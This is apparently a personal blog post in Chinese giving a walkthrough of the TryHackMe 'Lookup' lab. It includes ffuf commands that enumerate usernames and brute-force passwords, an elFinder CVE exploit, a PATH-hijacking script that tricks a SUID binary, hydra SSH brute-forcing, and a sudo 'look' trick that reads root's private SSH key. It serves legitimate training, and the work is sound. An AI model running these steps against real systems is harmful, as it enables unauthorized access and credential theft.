---
layout: post
title:  "TryHackMe Challenge Writeup: Lookup"
date:   25 June 2025
categories: Demo
tags: TryHackMe-Challenge Writeup
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
今天來解TryHackMe上的Challenge: [Lookup](https://tryhackme.com/room/lookup) 

以下是我的解題思路和歷程，紀錄自己嘗試了哪些手段以及學習了哪些新的攻擊手法和切入角度
  
### Step 1. Nmap
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5e:aa:9c:e1:dd:bb:cf:45:9b:fe:3e:2e:ef:9f:be:52 (RSA)
|   256 98:df:c7:bb:25:0a:26:fd:56:f5:30:ca:49:52:f0:15 (ECDSA)
|_  256 5c:2d:64:cf:b7:8c:d6:a9:37:e5:36:46:ee:5b:85:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- 一樣，22我們不關心，直接來看80

### Step 2. port80: website
- 瀏覽器手動打開IP:80，發現一個登錄界面
- 在尋找的過程中先用 gobuster 來找可能的路徑 => 沒找到
- 用whatweb找一下網站框架版本 => 沒什麼特別的

```bash
└─$ whatweb http://10.10.181.141         
http://10.10.181.141 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.181.141], RedirectLocation[http://lookup.thm]
http://lookup.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.181.141], PasswordField[password], Title[Login Page]
```

- 然後用burp suite先觀察一下它的登錄請求 => 發現用戶名和密碼是明碼傳送，可做字典檔攻擊(先不測試)
  
```yaml
POST /login.php HTTP/1.1
Host: lookup.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://lookup.thm
Connection: keep-alive
Referer: http://lookup.thm/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=john&password=password
```

### Step 3. Subdomain/Vhost
- 把目標放大一點，根據題目提示好像是有隱藏的subdomain可以挖掘
- 嘗試 ffuf subdomain enumeration: `ffuf -u http://10.10.181.141/ -H "Host: FUZZ.lookup.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200`
- 嘗試 gobuster vhost enumeration: `gobuster vhost -u "http://10.10.181.141" --domain lookup.thm --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50`
- 暫時都沒有結果

### Step 4. 回去ffuf
- 思路是用ffuf測試出有效的用戶名，然後進一步fuzz出密碼
- `ffuf -X POST -u http://lookup.thm/login.php -w /usr/share/wordlists/dirb/big.txt -d "username=FUZZ&password=123" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"`
- 首先先觀察錯誤的用戶名的response長度: word=10
- 添加filters: `ffuf -X POST -u http://lookup.thm/login.php -w /usr/share/wordlists/dirb/big.txt -d "username=FUZZ&password=123" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 10`
- 找到用戶名 **admin** 時response長度不同(word=8)，可能為有效的用戶名: 

```bash
admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 415ms]
```  
  
- 再測試有效密碼: `ffuf -X POST -u http://lookup.thm/login.php -w /usr/share/wordlists/dirb/big.txt -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 8`
- 找到一個密碼 **password123**
- 但是當我嘗試輸入admin/password123時卻還是顯示用戶名或密碼不對
- 嘗試看看還有沒有其他用戶，但這次用別的字典檔: `ffuf -X POST -u http://lookup.thm/login.php -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d "username=FUZZ&password=123" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 10`
- 找到另一個用戶 **jose**
- 嘗試登入後會把我們導向到 **files.lookpu.thm**；一樣，手動添加到 /etc/hosts

### Step 5. files.lookup.thm
- 首先先檢查看得到的文件有沒有有價值的東西，發現一個 credentials.txt 文件內容為: `think: nopassword`，先記下來
- 分別嘗試了用這組帳密登入 lookup.thm 和 ssh，都不行
- 那麼查查看elFinder有沒有已知漏洞，並且在網站中有一個很小的問號，點開可以查看版本號 (2.1.47)
- 直接查到 [CVE-2019-9194](https://www.exploit-db.com/exploits/46481)
![lookup-1](/assets/img/post-img/challenge-lookup-1.png)
- 直接成功，嘗試reverse shell，可以用這個 [reverse shell generator](https://www.revshells.com/)
![lookup-2](/assets/img/post-img/challenge-lookup-2.png)
- 一樣，先看/home下有什麼用戶，找到 think下有.ssh，但目前來說我們用戶是www-data，沒辦法讀取這組ssh

### Step 6. 嘗試提權到think
- linpeas 先跑
- `cat /etc/passwd`:

```bash
think:x:1000:1000:,,,:/home/think:/bin/bash
ssm-user:x:1001:1001::/home/ssm-user:/bin/sh
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
```

- 到/home下找到三個用戶: think/ssm-user/ubuntu，三個都有.ssh但目前都沒有權限
- linpeas有找到一個可疑的binary: `/usr/sbin/pwm`

```bash
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
```

- 簡單執行一下看到好像是通過執行id後拿取用戶名來查詢 `/home/{username}/.password`
- 那我們創造一個優先度更高的id command讓這個程序優先執行並返回我們創造的結果。下面首先創造一個名為id的bash file，然後放在/tmp目錄下，同時添加路徑/tmp到環境變數中並且優先度最前，這樣在運行id時就會優先抓/tmp下的id:

```bash
cd /tmp
echo '#!/bin/bash' > id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
chmod +x id
export PATH=/tmp:$PATH
```

- 之後執行 `/usr/sbin/pwm` 會dump出 `/home/think/.password`。然後將這份字典檔傳到自己攻擊主機後用 hydra 爆破用戶think密碼

```bash
└─$ hydra -l think -P password_list 10.10.181.141 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-25 01:11:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://10.10.181.141:22/
[22][ssh] host: 10.10.181.141   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-25 01:11:57
```

- 找到密碼後登入用戶think，成功獲得user flag

### Step 7. 提權到root
- sudo -l 查找有哪些sudo權限執行程序

```bash
[sudo] password for think: 
Matching Defaults entries for think on ip-10-10-181-141:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-10-181-141:
    (ALL) /usr/bin/look
```

- 上GTFOBins查look如果有sudo權限可不可以做提權，發現可以

```bash
think@ip-10-10-181-141:~$ LFILE=/root/.ssh/id_rsa
think@ip-10-10-181-141:~$ sudo look '' "$LFILE"
```

- 依照GTFOBins上面的步驟，將path_to_file改為/root/.ssh/id_rsa(因為前面發現三個用戶都有.ssh/，可以直接猜測root也有)獲得root金鑰
- 成功登入為root，獲得root權限

### 自我總結
個人覺得的難點:
- 根據response長度分析合法用戶名和密碼有哪些
- admin/password123一直嘗試但是都不行，其實要讓ffuf把更多結果跑出來
- reverse /usr/sbin/pwm 來完整分析到底怎麼使用 id 指令的
- 使用自己建造的bash來替代默認執行的程序並替換環境變數
- 剩下的root提權其實就單純想太多，應該直接嘗試 `sudo -l`

## 學習資料
1. [TryHackMe Challenge: Lookup](https://tryhackme.com/room/lookup) 
2. [Lookup Writeup](https://0xb0b.gitbook.io/writeups/tryhackme/2024/lookup)

</div>
</body>
</html>
